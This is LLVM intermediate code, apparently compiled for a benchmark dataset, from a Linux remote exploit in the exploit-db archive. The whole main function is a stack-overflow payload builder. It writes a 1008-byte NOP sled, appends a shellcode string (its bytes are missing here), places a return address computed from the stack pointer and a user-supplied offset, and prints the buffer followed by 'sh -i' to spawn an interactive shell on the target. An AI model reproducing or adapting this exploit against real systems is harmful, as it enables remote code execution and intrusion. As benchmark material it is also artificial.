; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_19109.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_19109.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@BUFFSIZE = common dso_local global i32 0, align 4
@shell = common dso_local global i8* null, align 8
@.str = private unnamed_addr constant [10 x i8] c"%s\0Ash -i\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i64, align 8
  %10 = alloca [4096 x i8], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %7, align 4
  %11 = load i8**, i8*** %5, align 8
  %12 = getelementptr inbounds i8*, i8** %11, i64 1
  %13 = load i8*, i8** %12, align 8
  %14 = call i32 @atoi(i8* %13)
  store i32 %14, i32* %8, align 4
  %15 = call i32 (...) @esp()
  %16 = load i32, i32* %8, align 4
  %17 = add nsw i32 %15, %16
  %18 = sext i32 %17 to i64
  store i64 %18, i64* %9, align 8
  store i32 0, i32* %6, align 4
  br label %19

19:                                               ; preds = %26, %2
  %20 = load i32, i32* %6, align 4
  %21 = icmp slt i32 %20, 1008
  br i1 %21, label %22, label %29

22:                                               ; preds = %19
  %23 = load i32, i32* %6, align 4
  %24 = sext i32 %23 to i64
  %25 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 %24
  store i8 -112, i8* %25, align 1
  br label %26

26:                                               ; preds = %22
  %27 = load i32, i32* %6, align 4
  %28 = add nsw i32 %27, 1
  store i32 %28, i32* %6, align 4
  br label %19

29:                                               ; preds = %19
  %30 = load i32, i32* @BUFFSIZE, align 4
  %31 = load i8*, i8** @shell, align 8
  %32 = call i32 @strlen(i8* %31)
  %33 = sub nsw i32 %30, %32
  store i32 %33, i32* %6, align 4
  br label %34

34:                                               ; preds = %48, %29
  %35 = load i32, i32* %6, align 4
  %36 = load i32, i32* @BUFFSIZE, align 4
  %37 = icmp slt i32 %35, %36
  br i1 %37, label %38, label %51

38:                                               ; preds = %34
  %39 = load i8*, i8** @shell, align 8
  %40 = load i32, i32* %7, align 4
  %41 = add nsw i32 %40, 1
  store i32 %41, i32* %7, align 4
  %42 = sext i32 %40 to i64
  %43 = getelementptr inbounds i8, i8* %39, i64 %42
  %44 = load i8, i8* %43, align 1
  %45 = load i32, i32* %6, align 4
  %46 = sext i32 %45 to i64
  %47 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 %46
  store i8 %44, i8* %47, align 1
  br label %48

48:                                               ; preds = %38
  %49 = load i32, i32* %6, align 4
  %50 = add nsw i32 %49, 1
  store i32 %50, i32* %6, align 4
  br label %34

51:                                               ; preds = %34
  store i32 1005, i32* %6, align 4
  %52 = load i64, i64* %9, align 8
  %53 = and i64 %52, 255
  %54 = trunc i64 %53 to i8
  %55 = load i32, i32* %6, align 4
  %56 = sext i32 %55 to i64
  %57 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 %56
  store i8 %54, i8* %57, align 1
  %58 = load i64, i64* %9, align 8
  %59 = lshr i64 %58, 8
  %60 = and i64 %59, 255
  %61 = trunc i64 %60 to i8
  %62 = load i32, i32* %6, align 4
  %63 = add nsw i32 %62, 1
  %64 = sext i32 %63 to i64
  %65 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 %64
  store i8 %61, i8* %65, align 1
  %66 = load i64, i64* %9, align 8
  %67 = lshr i64 %66, 16
  %68 = and i64 %67, 255
  %69 = trunc i64 %68 to i8
  %70 = load i32, i32* %6, align 4
  %71 = add nsw i32 %70, 2
  %72 = sext i32 %71 to i64
  %73 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 %72
  store i8 %69, i8* %73, align 1
  %74 = load i64, i64* %9, align 8
  %75 = lshr i64 %74, 24
  %76 = and i64 %75, 255
  %77 = trunc i64 %76 to i8
  %78 = load i32, i32* %6, align 4
  %79 = add nsw i32 %78, 3
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 %80
  store i8 %77, i8* %81, align 1
  %82 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 0
  %83 = call i32 @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str, i64 0, i64 0), i8* %82)
  %84 = load i32, i32* %3, align 4
  ret i32 %84
}

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @esp(...) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @printf(i8*, i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
